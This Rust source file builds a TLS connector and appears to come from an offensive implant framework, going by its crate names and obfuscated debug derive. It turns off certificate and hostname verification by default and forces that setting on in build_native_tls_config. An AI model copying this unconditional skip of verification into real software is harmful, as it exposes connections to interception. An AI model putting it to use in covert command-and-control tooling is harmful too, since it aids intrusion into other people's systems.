use anyhow::Result;
use async_native_tls::TlsConnector;
use malefic_common::debug;
use malefic_config::ServerConfig;
use malefic_gateway::ObfDebug;

#[derive(ObfDebug, Clone)]
pub struct NativeTlsConfig {
    pub server_name: String,
    pub skip_verification: bool,
}

impl Default for NativeTlsConfig {
    fn default() -> Self {
        Self {
            server_name: String::new(),
            skip_verification: true,
        }
    }
}

impl NativeTlsConfig {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn with_server_name<S: Into<String>>(mut self, name: S) -> Self {
        self.server_name = name.into();
        self
    }
}

pub struct NativeTlsConnectorBuilder {
    config: NativeTlsConfig,
}

impl NativeTlsConnectorBuilder {
    pub fn new(config: NativeTlsConfig) -> Self {
        Self { config }
    }

    pub fn build(self) -> Result<TlsConnector> {
        debug!(
            "[native-tls] Building native TLS connector with config: {:#?}",
            self.config
        );

        let mut builder = async_native_tls::TlsConnector::new();
        if self.config.skip_verification {
            builder = builder.danger_accept_invalid_certs(true);
            builder = builder.danger_accept_invalid_hostnames(true);
        }

        Ok(builder)
    }
}

pub fn build_native_tls_config(config: ServerConfig) -> NativeTlsConfig {
    debug!("address: {}", config.address);
    let tls_config = config.tls_config.as_ref().unwrap();

    let mut ntls_config = NativeTlsConfig::new();
    ntls_config = ntls_config.with_server_name(tls_config.sni.clone());
    ntls_config.skip_verification = true;

    ntls_config
}
